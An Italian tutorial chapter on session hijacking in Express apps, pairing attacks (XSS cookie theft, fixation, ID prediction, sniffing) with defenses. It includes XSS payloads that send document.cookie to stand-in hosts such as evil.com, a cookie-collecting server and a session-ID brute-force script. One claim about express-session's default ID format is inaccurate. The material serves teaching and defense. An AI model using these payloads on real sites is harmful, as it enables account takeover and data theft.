# 18. Session Hijacking e Session Management

## 18.1 Introduzione

**Session Hijacking** è l'attacco dove un malintenzionato **ruba o indovina** il session ID di un utente legittimo per **impersonarlo**.

**Impatto:**
- 🔴 Accesso non autorizzato all'account
- 🔴 Furto dati personali
- 🔴 Transazioni fraudolente
- 🔴 Privilege escalation
- 🔴 Data breach

## 18.2 Cookie Theft via XSS

### 18.2.1 - Attacco

**Scenario:** Attaccante inietta JavaScript che ruba cookie.

```javascript
// XSS payload iniettato
<script>
    // Ruba cookie e invia ad attaccante
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Flusso completo:**
```
1. Attaccante trova XSS vulnerability su bank.com
2. Inietta payload: 
   <script>
   fetch('http://evil.com/steal?c=' + document.cookie);
   </script>
3. Vittima visita pagina compromessa
4. Browser esegue script, invia cookie ad evil.com
5. Attaccante riceve: session=abc123xyz
6. Attaccante usa cookie per impersonare vittima su bank.com
7. Accesso completo all'account vittima!
```

**Attacker server riceve cookie:**
```javascript
// evil.com/steal endpoint
const express = require('express');
const app = express();

app.get('/steal', (req, res) => {
    const stolenCookie = req.query.c;
    
    console.log('🎯 Cookie rubato:', stolenCookie);
    
    // Salva in database
    db.insert({ cookie: stolenCookie, timestamp: new Date() });
    
    // Risposta trasparente (vittima non nota nulla)
    res.status(204).send();
});

app.listen(80);
```

### 18.2.2 - Defense: HttpOnly Cookie

**✅ SOLUZIONE: HttpOnly flag**

```javascript
const session = require('express-session');

app.use(session({
    secret: 'secret-key-change-me',
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,  // ✅ JavaScript NON può leggere cookie
        secure: true,    // ✅ Solo HTTPS
        sameSite: 'strict', // ✅ Anti-CSRF
        maxAge: 3600000  // 1 ora
    }
}));
```

**HTTP Response con HttpOnly:**
```http
HTTP/2 200 OK
Set-Cookie: session=abc123xyz; HttpOnly; Secure; SameSite=Strict; Path=/

<!-- JavaScript non può accedere a questo cookie -->
```

**Test JavaScript:**
```javascript
console.log(document.cookie);
// Output: "" (vuoto)
// Cookie HttpOnly non visibile a JavaScript!

// XSS payload inefficace:
fetch('http://attacker.com/steal?cookie=' + document.cookie);
// Invia stringa vuota → attacco fallito!
```

---

## 18.3 Session Fixation

### 18.3.1 - Attacco

**Scenario:** Attaccante **forza** vittima a usare session ID **noto all'attaccante**.

**Flusso attacco:**
```
1. Attaccante visita bank.com, ottiene: session=attacker123

2. Attaccante invia link a vittima:
   http://bank.com/?session=attacker123
   o
   http://bank.com/login
   + Cookie: session=attacker123 (set via XSS/script)

3. Vittima clicca link e fa login su bank.com
   Server accetta session=attacker123 (già esistente)
   
4. Dopo login, sessione attacker123 è ora AUTENTICATA

5. Attaccante usa session=attacker123
   → Accesso come vittima autenticata!
```

**Esempio concreto:**
```html
<!-- Email phishing inviata a vittima -->
<a href="http://bank.com/login?PHPSESSID=attacker_session_123">
    Clicca qui per accedere al tuo conto
</a>

<!-- Vittima clicca, fa login -->
<!-- Session attacker_session_123 ora autenticata -->
<!-- Attaccante accede con stessa session -->
```

**Variante - Cookie injection via subdomain:**
```javascript
// Attaccante controlla evil.bank.com (subdomain)
// Imposta cookie per .bank.com (parent domain)

document.cookie = "session=attacker123; domain=.bank.com; path=/";

// Vittima visita bank.com
// Browser invia cookie session=attacker123
// Login avviene con session fissata
```

### 18.3.2 - Defense: Session Regeneration

**✅ SOLUZIONE: Regenerate session ID dopo login**

```javascript
const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt');

const app = express();

app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: true,
        sameSite: 'strict'
    }
}));

app.use(express.urlencoded({ extended: true }));

// Login endpoint
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // Autentica utente
    const user = await db.findOne({ username });
    
    if (!user || !await bcrypt.compare(password, user.passwordHash)) {
        return res.status(401).send('Invalid credentials');
    }
    
    // ✅ REGENERATE SESSION dopo login riuscito
    req.session.regenerate((err) => {
        if (err) {
            return res.status(500).send('Session error');
        }
        
        // Imposta dati utente nella NUOVA sessione
        req.session.user = {
            id: user.id,
            username: user.username,
            role: user.role
        };
        
        req.session.save((err) => {
            if (err) return res.status(500).send('Session save error');
            
            res.redirect('/dashboard');
        });
    });
});

// Logout con destroy
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        res.redirect('/login');
    });
});

app.listen(3000);
```

**Cosa succede:**
```
1. Attaccante: session=attacker123
2. Vittima riceve link con session=attacker123
3. Vittima fa login con credenziali valide
4. Server chiama req.session.regenerate()
   → Vecchia session attacker123 DISTRUTTA
   → Nuova session abc456xyz CREATA
5. Vittima ora ha session=abc456xyz
6. Attaccante prova session=attacker123
   → Session non più valida
   → Attacco fallito!
```

**Session regeneration anche per privilege escalation:**

```javascript
// User diventa admin
app.post('/promote-to-admin', (req, res) => {
    const user = req.session.user;
    
    // Verifica permessi
    if (!canPromote(user)) {
        return res.status(403).send('Forbidden');
    }
    
    // ✅ Regenerate session quando cambiano privilegi
    req.session.regenerate((err) => {
        req.session.user = {
            ...user,
            role: 'admin'  // Promoted
        };
        
        req.session.save(() => {
            res.send('Promoted to admin');
        });
    });
});
```

---

## 18.4 Session Prediction

### 18.4.1 - Attacco

**Scenario:** Session ID **prevedibili** permettono di indovinarli.

**Esempio session ID deboli:**
```
session=1
session=2
session=3
...
→ Attaccante prova valori incrementali

session=user123_20231030_143000
→ Username + timestamp prevedibile

session=md5(username)
→ Hash prevedibile se conosci username
```

**Brute force session IDs:**
```python
import requests

# Prova session IDs sequenziali
for i in range(1, 10000):
    cookies = {'session': str(i)}
    r = requests.get('http://bank.com/dashboard', cookies=cookies)
    
    if 'Welcome' in r.text:
        print(f'✅ Valid session found: {i}')
        break
```

### 18.4.2 - Defense: Strong Random Session IDs

**✅ Express-session usa UUID v4 (default):**

```javascript
// express-session genera automaticamente ID sicuri
// Esempio: a3f7b2c9-1e4d-4a8c-9f2b-7c6e5d3a1b0f
// 128-bit random UUID
// Impossibile predire o brute force
```

**Implementazione custom:**

```javascript
const crypto = require('crypto');

function generateSecureSessionId() {
    // 32 bytes random (256-bit)
    return crypto.randomBytes(32).toString('hex');
    // Esempio output: 7a8f9b2c...64 caratteri hex
}

// Store in Redis
const session = {
    id: generateSecureSessionId(),
    user: { id: 123, username: 'mario' },
    createdAt: new Date(),
    expiresAt: new Date(Date.now() + 3600000) // 1 ora
};

redis.setex(`session:${session.id}`, 3600, JSON.stringify(session));
```

---

## 18.5 Network Sniffing

### 18.5.1 - Attacco

**Scenario:** Attaccante **intercetta** traffico di rete e cattura session cookie.

**HTTP senza TLS (traffico in chiaro):**
```
GET /dashboard HTTP/1.1
Host: bank.com
Cookie: session=abc123xyz

← Attaccante su stesso WiFi vede cookie in chiaro!
```

**Wireshark capture:**
```bash
# Attaccante esegue
sudo wireshark -i wlan0

# Filter: http.cookie
# Risultato: Tutti i cookie HTTP visibili!
```

### 18.5.2 - Defense: HTTPS + Secure Cookie

**✅ SOLUZIONE: HTTPS obbligatorio**

```javascript
app.use(session({
    cookie: {
        secure: true,  // ✅ Cookie inviato SOLO su HTTPS
        httpOnly: true,
        sameSite: 'strict'
    }
}));

// Force HTTPS
app.use((req, res, next) => {
    if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
        return res.redirect(301, `https://${req.hostname}${req.url}`);
    }
    next();
});
```

**Con Secure flag:**
```http
HTTP/2 200 OK
Set-Cookie: session=abc123xyz; Secure; HttpOnly; SameSite=Strict

<!-- Cookie inviato SOLO su HTTPS -->
<!-- Wireshark vede traffico criptato TLS → cookie non leggibile -->
```

---

## 18.6 Session Timeout

### 18.6.1 - Implementazione

**Timeout inattività:**

```javascript
const session = require('express-session');

app.use(session({
    secret: 'secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        maxAge: 30 * 60 * 1000, // 30 minuti inattività
        httpOnly: true,
        secure: true
    },
    rolling: true  // Reset maxAge ad ogni richiesta
}));

// Middleware check session expiration
app.use((req, res, next) => {
    if (req.session && req.session.user) {
        const now = Date.now();
        const lastActivity = req.session.lastActivity || now;
        const timeout = 30 * 60 * 1000; // 30 minuti
        
        if (now - lastActivity > timeout) {
            // Session scaduta per inattività
            req.session.destroy();
            return res.redirect('/login?timeout=1');
        }
        
        // Aggiorna last activity
        req.session.lastActivity = now;
    }
    next();
});
```

**Timeout assoluto (anche se attivo):**

```javascript
app.use((req, res, next) => {
    if (req.session && req.session.user) {
        const createdAt = req.session.createdAt;
        const maxSessionLife = 8 * 60 * 60 * 1000; // 8 ore MAX
        
        if (Date.now() - createdAt > maxSessionLife) {
            // Forza re-login dopo 8 ore
            req.session.destroy();
            return res.redirect('/login?expired=1');
        }
    }
    next();
});

// Salva createdAt al login
app.post('/login', (req, res) => {
    req.session.regenerate((err) => {
        req.session.user = authenticatedUser;
        req.session.createdAt = Date.now();  // ✅ Timestamp creazione
        req.session.lastActivity = Date.now();
        res.redirect('/dashboard');
    });
});
```

---

## 18.7 Session Storage

### 18.7.1 - Redis Session Store

**✅ Production: store sessions in Redis (distributed, fast)**

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');

const redisClient = redis.createClient({
    host: 'localhost',
    port: 6379,
    password: 'redis-password'
});

app.use(session({
    store: new RedisStore({ client: redisClient }),
    secret: 'secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,
        httpOnly: true,
        maxAge: 3600000 // 1 ora
    }
}));

// Redis TTL automatico per session cleanup
// Quando maxAge scade, Redis elimina session automaticamente
```

**Vantaggi Redis:**
```
✅ Scalabile (multiple server condividono sessions)
✅ Veloce (in-memory)
✅ Auto-expiration (TTL)
✅ Persistence configurabile
✅ Clustering support
```

### 18.7.2 - Session Invalidation

**Logout forzato (admin panel):**

```javascript
// Admin forza logout utente
app.post('/admin/force-logout/:userId', async (req, res) => {
    const userId = req.params.userId;
    
    // Find all sessions for user
    const pattern = 'sess:*';
    const keys = await redisClient.keys(pattern);
    
    for (const key of keys) {
        const sessionData = await redisClient.get(key);
        const session = JSON.parse(sessionData);
        
        if (session.user && session.user.id === userId) {
            // Delete session
            await redisClient.del(key);
            console.log(`Deleted session: ${key}`);
        }
    }
    
    res.send('User logged out forcefully');
});

// Logout da tutti i dispositivi (user request)
app.post('/logout-all-devices', async (req, res) => {
    const currentUserId = req.session.user.id;
    
    // Invalida tutte le sessioni tranne quella corrente
    const pattern = 'sess:*';
    const keys = await redisClient.keys(pattern);
    
    for (const key of keys) {
        if (key === `sess:${req.sessionID}`) continue; // Skip current
        
        const sessionData = await redisClient.get(key);
        const session = JSON.parse(sessionData);
        
        if (session.user && session.user.id === currentUserId) {
            await redisClient.del(key);
        }
    }
    
    res.send('Logged out from all other devices');
});
```

---

## 18.8 Best Practices

### 18.8.1 - Checklist Sicurezza Sessioni

**Cookie Flags:**
```
✅ HttpOnly: true (anti-XSS)
✅ Secure: true (solo HTTPS)
✅ SameSite: 'strict' o 'lax' (anti-CSRF)
✅ Domain: specific (no wildcard)
✅ Path: / (o più restrittivo)
```

**Session Management:**
```
✅ Regenerate session on login
✅ Regenerate session on privilege change
✅ Strong random session IDs (UUID v4, 128-bit+)
✅ Session timeout (inattività + assoluto)
✅ Redis/memcached storage (no memory store)
✅ HTTPS obbligatorio
✅ Logout functionality
✅ Force logout capability (admin)
```

**Monitoring:**
```
✅ Log session creation/destruction
✅ Alert su session anomale (multiple IPs)
✅ Track concurrent sessions per user
✅ Session activity logs
```

### 18.8.2 - Complete Secure Config

```javascript
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis')(session);
const redis = require('redis');
const helmet = require('helmet');

const app = express();

const redisClient = redis.createClient({
    host: process.env.REDIS_HOST,
    port: process.env.REDIS_PORT,
    password: process.env.REDIS_PASSWORD
});

// Security headers
app.use(helmet());

// Force HTTPS
app.use((req, res, next) => {
    if (!req.secure && process.env.NODE_ENV === 'production') {
        return res.redirect(301, `https://${req.hostname}${req.url}`);
    }
    next();
});

// Session configuration
app.use(session({
    store: new RedisStore({ client: redisClient }),
    secret: process.env.SESSION_SECRET,
    name: 'sid', // Non usare 'connect.sid' (default)
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        sameSite: 'strict',
        maxAge: 30 * 60 * 1000, // 30 min
        domain: process.env.COOKIE_DOMAIN
    },
    rolling: true // Refresh session on activity
}));

// Session timeout middleware
app.use((req, res, next) => {
    if (req.session && req.session.user) {
        const now = Date.now();
        const createdAt = req.session.createdAt || now;
        const lastActivity = req.session.lastActivity || now;
        
        const MAX_SESSION_LIFE = 8 * 60 * 60 * 1000; // 8 hours
        const INACTIVITY_TIMEOUT = 30 * 60 * 1000; // 30 min
        
        if (now - createdAt > MAX_SESSION_LIFE) {
            req.session.destroy();
            return res.redirect('/login?expired=1');
        }
        
        if (now - lastActivity > INACTIVITY_TIMEOUT) {
            req.session.destroy();
            return res.redirect('/login?timeout=1');
        }
        
        req.session.lastActivity = now;
    }
    next();
});

// Login with session regeneration
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await authenticateUser(username, password);
    
    if (!user) {
        return res.status(401).send('Invalid credentials');
    }
    
    // Regenerate session
    req.session.regenerate((err) => {
        if (err) return res.status(500).send('Error');
        
        req.session.user = {
            id: user.id,
            username: user.username,
            role: user.role
        };
        req.session.createdAt = Date.now();
        req.session.lastActivity = Date.now();
        
        req.session.save(() => {
            res.json({ success: true });
        });
    });
});

// Logout
app.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        res.clearCookie('sid');
        res.redirect('/login');
    });
});

app.listen(3000);
```

---

**Capitolo 18 completato!**

Prossimo: **Capitolo 19 - Clickjacking**
